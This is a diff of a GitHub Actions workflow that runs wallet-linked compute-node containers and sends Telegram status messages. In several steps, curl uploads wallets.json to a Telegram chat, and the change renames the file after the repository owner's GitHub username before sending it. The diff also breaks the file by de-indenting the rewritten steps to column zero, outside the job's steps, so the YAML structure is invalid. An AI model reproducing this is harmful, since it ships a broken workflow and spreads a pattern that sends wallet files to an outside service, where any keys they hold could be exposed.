@@ -276,106 +276,114 @@ jobs:
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           
           echo "started=$STARTED" >> $GITHUB_OUTPUT
-      
-      # ============================================
-      # 📱 TELEGRAM NOTIFICATION #1: DEPLOYMENT
-      # ============================================
-      
-      - name: 📱 Send Deployment Success Notification
-        if: success()
-        env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-        run: |
-          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
-            echo "⚠️  Telegram not configured, skipping"
-            exit 0
-          fi
-          
-          echo "📱 Sending deployment notification..."
-          
-          # Get wallet info
-          WALLET_COUNT=$(jq '. | length' wallets.json)
-          FIRST_WALLET=$(jq -r '.[0].address' wallets.json)
-          
-          # Get container stats
-          RUNNING=$(docker ps --filter "name=compute_node" --filter "status=running" | wc -l)
-          RUNNING=$((RUNNING - 1))
-          
-          TOTAL=$(docker ps -a --filter "name=compute_node" | wc -l)
-          TOTAL=$((TOTAL - 1))
-          
-          # Calculate success rate
-          if [ "$TOTAL" -gt 0 ]; then
-            SUCCESS_RATE=$(( RUNNING * 100 / TOTAL ))
-          else
-            SUCCESS_RATE=0
-          fi
-          
-          # Detect trigger type
-          TRIGGER="${{ github.event_name }}"
-          if [ "$TRIGGER" = "schedule" ]; then
-            TRIGGER_TEXT="Auto-Schedule"
-          else
-            TRIGGER_TEXT="Manual"
-          fi
-          
-          # Get repo name (short)
-          REPO_SHORT=$(echo "${{ github.repository }}" | cut -d'/' -f2)
-          
-          # Construct message
-          MESSAGE="🚀 *Deployment Complete!*
 
-          🐳 Containers: \`$RUNNING/$TOTAL\` ($SUCCESS_RATE%)
-          💰 Wallets: \`$WALLET_COUNT\`
-          📍 First: \`${FIRST_WALLET:0:10}...${FIRST_WALLET: -8}\`
-          🔄 Trigger: $TRIGGER_TEXT
-          📦 Repo: \`$REPO_SHORT\`
-          #️⃣ Run: \`#${{ github.run_number }}\`
 
-          ⏱️ Runtime: $RUNTIME_HOURS hours
-          🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
-          
-          # Send text message
-          echo "📤 Sending message..."
-          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-            -d chat_id="${CHAT_ID}" \
-            -d parse_mode="Markdown" \
-            -d disable_web_page_preview=true \
-            -d text="$MESSAGE")
-          
-          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
-          if [ "$MSG_OK" = "true" ]; then
-            echo "✅ Message sent"
-          else
-            echo "❌ Failed to send message"
-            echo "Response: $SEND_MSG"
-          fi
-          
-          # Send wallets.json file
-          if [ -f "wallets.json" ]; then
-            echo "📤 Sending wallets.json file..."
-            
-            CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
-            
-            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
-              -F chat_id="${CHAT_ID}" \
-              -F document=@wallets.json \
-              -F caption="$CAPTION")
-            
-            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
-            if [ "$DOC_OK" = "true" ]; then
-              echo "✅ File sent"
-            else
-              echo "❌ Failed to send file"
-              echo "Response: $SEND_DOC"
-            fi
-          else
-            echo "⚠️  wallets.json not found"
-          fi
-          
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "✅ Deployment notification completed"
+- name: 📱 Send Deployment Success Notification
+  if: success()
+  env:
+    BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+    CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+  run: |
+    if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+      echo "⚠️  Telegram not configured, skipping"
+      exit 0
+    fi
+    
+    echo "📱 Sending deployment notification..."
+    
+    # Get wallet info
+    WALLET_COUNT=$(jq '. | length' wallets.json)
+    FIRST_WALLET=$(jq -r '.[0].address' wallets.json)
+    
+    # Get container stats
+    RUNNING=$(docker ps --filter "name=compute_node" --filter "status=running" | wc -l)
+    RUNNING=$((RUNNING - 1))
+    
+    TOTAL=$(docker ps -a --filter "name=compute_node" | wc -l)
+    TOTAL=$((TOTAL - 1))
+    
+    # Calculate success rate
+    if [ "$TOTAL" -gt 0 ]; then
+      SUCCESS_RATE=$(( RUNNING * 100 / TOTAL ))
+    else
+      SUCCESS_RATE=0
+    fi
+    
+    # Detect trigger type
+    TRIGGER="${{ github.event_name }}"
+    if [ "$TRIGGER" = "schedule" ]; then
+      TRIGGER_TEXT="Auto-Schedule"
+    else
+      TRIGGER_TEXT="Manual"
+    fi
+    
+    # Get GitHub username (owner)
+    GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
+    
+    # Get full repo URL
+    REPO_URL="https://github.com/${{ github.repository }}"
+    
+    # Construct message
+    MESSAGE="🚀 *Deployment Complete!*
+
+    🐳 Containers: \`$RUNNING/$TOTAL\` ($SUCCESS_RATE%)
+    💰 Wallets: \`$WALLET_COUNT\`
+    📍 First: \`${FIRST_WALLET:0:10}...${FIRST_WALLET: -8}\`
+    🔄 Trigger: $TRIGGER_TEXT
+    📦 Repo: $REPO_URL
+    #️⃣ Run: \`#${{ github.run_number }}\`
+
+    ⏱️ Runtime: $RUNTIME_HOURS hours
+    🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
+    
+    # Send text message
+    echo "📤 Sending message..."
+    SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+      -d chat_id="${CHAT_ID}" \
+      -d parse_mode="Markdown" \
+      -d disable_web_page_preview=true \
+      -d text="$MESSAGE")
+    
+    MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
+    if [ "$MSG_OK" = "true" ]; then
+      echo "✅ Message sent"
+    else
+      echo "❌ Failed to send message"
+      echo "Response: $SEND_MSG"
+    fi
+    
+    # Send wallets.json file with GitHub username
+    if [ -f "wallets.json" ]; then
+      echo "📤 Sending wallets.json file..."
+      
+      # Rename file with GitHub username
+      USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
+      cp wallets.json "$USER_WALLET_FILE"
+      
+      CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
+      
+      SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+        -F chat_id="${CHAT_ID}" \
+        -F document=@"$USER_WALLET_FILE" \
+        -F caption="$CAPTION")
+      
+      DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
+      if [ "$DOC_OK" = "true" ]; then
+        echo "✅ File sent as: $USER_WALLET_FILE"
+      else
+        echo "❌ Failed to send file"
+        echo "Response: $SEND_DOC"
+      fi
+      
+      # Cleanup temp file
+      rm -f "$USER_WALLET_FILE"
+    else
+      echo "⚠️  wallets.json not found"
+    fi
+    
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "✅ Deployment notification completed"
+    
       
       # ============================================
       # ⏰ RUNTIME
@@ -429,145 +437,140 @@ jobs:
           retention-days: 7
           if-no-files-found: warn
       
-      # ============================================
-      # 📱 TELEGRAM NOTIFICATION #2: COMPLETE
-      # ============================================
+- name: 📱 Send Final Success Notification
+  if: success()
+  env:
+    BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+    CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+  run: |
+    if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+      echo "ℹ️  Telegram not configured, skipping"
+      exit 0
+    fi
+    
+    echo "📱 Sending completion notification..."
+    
+    # Get wallet info
+    WALLET_COUNT=$(jq '. | length' wallets.json 2>/dev/null || echo "0")
+    
+    # Get GitHub username (owner)
+    GITHUB_USER=$(echo "${{ github.repository }}" | cut -d'/' -f1)
+    
+    # Get full repo URL
+    REPO_URL="https://github.com/${{ github.repository }}"
+    
+    # Duration
+    DURATION="$RUNTIME_HOURS hours"
+    
+    # Construct message
+    MESSAGE="🎉 *Runtime Complete!*
+
+    📦 Repo: $REPO_URL
+    #️⃣ Run: \`#${{ github.run_number }}\`
+    ⏱️ Duration: \`$DURATION\`
+    💰 Wallets: \`$WALLET_COUNT\`
+    🐳 Containers: \`$(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))\`
+
+    ✅ All tasks completed successfully
+
+    🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
+    
+    # Send text message
+    echo "📤 Sending message..."
+    SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+      -d chat_id="${CHAT_ID}" \
+      -d parse_mode="Markdown" \
+      -d disable_web_page_preview=true \
+      -d text="$MESSAGE")
+    
+    MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
+    if [ "$MSG_OK" = "true" ]; then
+      echo "✅ Message sent"
+    else
+      echo "❌ Failed to send message"
+    fi
+    
+    # Send wallets.json file with GitHub username
+    if [ -f "wallets.json" ]; then
+      echo "📤 Sending wallets file..."
       
-      - name: 📱 Send Final Success Notification
-        if: success()
-        env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-        run: |
-          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
-            echo "ℹ️  Telegram not configured, skipping"
-            exit 0
-          fi
-          
-          echo "📱 Sending completion notification..."
-          
-          # Get wallet info
-          WALLET_COUNT=$(jq '. | length' wallets.json 2>/dev/null || echo "0")
-          
-          # Get repo name
-          REPO_SHORT=$(echo "${{ github.repository }}" | cut -d'/' -f2)
-          
-          # Duration
-          DURATION="$RUNTIME_HOURS hours"
-          
-          # Construct message
-          MESSAGE="🎉 *Runtime Complete!*
-
-          📦 Repo: \`$REPO_SHORT\`
-          #️⃣ Run: \`#${{ github.run_number }}\`
-          ⏱️ Duration: \`$DURATION\`
-          💰 Wallets: \`$WALLET_COUNT\`
-          🐳 Containers: \`$(( $WALLET_COUNT * $CONTAINERS_PER_WALLET ))\`
-
-          ✅ All tasks completed successfully
-
-          🔗 [View Run](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
-          
-          # Send text message
-          echo "📤 Sending message..."
-          SEND_MSG=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-            -d chat_id="${CHAT_ID}" \
-            -d parse_mode="Markdown" \
-            -d disable_web_page_preview=true \
-            -d text="$MESSAGE")
-          
-          MSG_OK=$(echo "$SEND_MSG" | jq -r '.ok')
-          if [ "$MSG_OK" = "true" ]; then
-            echo "✅ Message sent"
-          else
-            echo "❌ Failed to send message"
-          fi
-          
-          # Send wallets.json file with repo name
-          if [ -f "wallets.json" ]; then
-            echo "📤 Sending wallets file..."
-            
-            # Rename file temporarily with repo name
-            REPO_FILE="${REPO_SHORT}-wallets.json"
-            cp wallets.json "$REPO_FILE"
-            
-            CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
-            
-            SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
-              -F chat_id="${CHAT_ID}" \
-              -F document=@"$REPO_FILE" \
-              -F caption="$CAPTION")
-            
-            DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
-            if [ "$DOC_OK" = "true" ]; then
-              echo "✅ File sent as: $REPO_FILE"
-            else
-              echo "❌ Failed to send file"
-            fi
-            
-            # Cleanup temp file
-            rm -f "$REPO_FILE"
-          else
-            echo "⚠️  wallets.json not found"
-          fi
-          
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "✅ Completion notification sent"
+      # Rename file with GitHub username
+      USER_WALLET_FILE="${GITHUB_USER}-wallets.json"
+      cp wallets.json "$USER_WALLET_FILE"
       
-      # ============================================
-      # 📱 TELEGRAM NOTIFICATION #3: FAILURE
-      # ============================================
+      CAPTION="💰 $WALLET_COUNT wallets | Run #${{ github.run_number }}"
       
-      - name: 📱 Send Failure Notification
-        if: failure()
-        env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-        run: |
-          if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
-            exit 0
-          fi
-          
-          echo "📱 Sending failure notification..."
-          
-          # Get repo name
-          REPO_SHORT=$(echo "${{ github.repository }}" | cut -d'/' -f2)
-          
-          # Get current timestamp
-          CURRENT_TIME=$(date -u '+%Y-%m-%d %H:%M UTC')
-          
-          # Detect trigger
-          TRIGGER="${{ github.event_name }}"
-          if [ "$TRIGGER" = "schedule" ]; then
-            TRIGGER_TEXT="Auto"
-          else
-            TRIGGER_TEXT="Manual"
-          fi
-          
-          # Construct message
-          MESSAGE="🚨 *ERROR ALERT*
+      SEND_DOC=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+        -F chat_id="${CHAT_ID}" \
+        -F document=@"$USER_WALLET_FILE" \
+        -F caption="$CAPTION")
+      
+      DOC_OK=$(echo "$SEND_DOC" | jq -r '.ok')
+      if [ "$DOC_OK" = "true" ]; then
+        echo "✅ File sent as: $USER_WALLET_FILE"
+      else
+        echo "❌ Failed to send file"
+      fi
+      
+      # Cleanup temp file
+      rm -f "$USER_WALLET_FILE"
+    else
+      echo "⚠️  wallets.json not found"
+    fi
+    
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "✅ Completion notification sent"
+      
+- name: 📱 Send Failure Notification
+  if: failure()
+  env:
+    BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+    CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+  run: |
+    if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+      exit 0
+    fi
+    
+    echo "📱 Sending failure notification..."
+    
+    # Get full repo URL
+    REPO_URL="https://github.com/${{ github.repository }}"
+    
+    # Get current timestamp
+    CURRENT_TIME=$(date -u '+%Y-%m-%d %H:%M UTC')
+    
+    # Detect trigger
+    TRIGGER="${{ github.event_name }}"
+    if [ "$TRIGGER" = "schedule" ]; then
+      TRIGGER_TEXT="Auto"
+    else
+      TRIGGER_TEXT="Manual"
+    fi
+    
+    # Construct message
+    MESSAGE="🚨 *ERROR ALERT*
 
-          *STATUS*
-          ├─ State: Failed
-          ├─ Exit Code: 1
-          └─ Duration: Check logs
+    *STATUS*
+    ├─ State: Failed
+    ├─ Exit Code: 1
+    └─ Duration: Check logs
 
-          *CONTEXT*
-          ├─ Repo: \`$REPO_SHORT\`
-          ├─ Run: \`#${{ github.run_number }}\`
-          ├─ Trigger: $TRIGGER_TEXT
-          └─ Time: $CURRENT_TIME
+    *CONTEXT*
+    ├─ Repo: $REPO_URL
+    ├─ Run: \`#${{ github.run_number }}\`
+    ├─ Trigger: $TRIGGER_TEXT
+    └─ Time: $CURRENT_TIME
 
-          *ACTION REQUIRED*
-          └─ Check logs for details
+    *ACTION REQUIRED*
+    └─ Check logs for details
 
-          🔍 [View Logs](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
-          
-          # Send message
-          curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-            -d chat_id="${CHAT_ID}" \
-            -d parse_mode="Markdown" \
-            -d disable_web_page_preview=true \
-            -d text="$MESSAGE" > /dev/null
-          
-          echo "✅ Failure notification sent"
+    🔍 [View Logs](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
+    
+    # Send message
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+      -d chat_id="${CHAT_ID}" \
+      -d parse_mode="Markdown" \
+      -d disable_web_page_preview=true \
+      -d text="$MESSAGE" > /dev/null
+    
+    echo "✅ Failure notification sent"
